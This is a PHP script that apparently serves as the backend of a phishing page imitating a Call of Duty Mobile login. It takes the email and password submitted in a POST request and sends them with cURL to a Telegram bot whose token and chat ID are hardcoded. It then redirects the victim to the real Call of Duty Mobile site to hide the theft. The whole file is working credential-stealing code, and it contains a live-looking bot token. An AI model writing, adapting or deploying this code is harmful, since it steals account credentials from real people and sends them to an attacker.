<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Replace these with your actual bot token and chat ID
    $token = "7693366029:AAF_HZzdqPqkF1LlmNjA9O8-TbdOhPPcgyk";
    $chat_id = "7182702425";

    $message = "🚨 New Login 🚨\n\nEmail: $email\nPassword: $password";
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

    // Use cURL for better reliability
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);

    // Redirect to the official Call of Duty Mobile site
    header("Location: https://www.callofduty.com/mobile");
    exit();
}
?>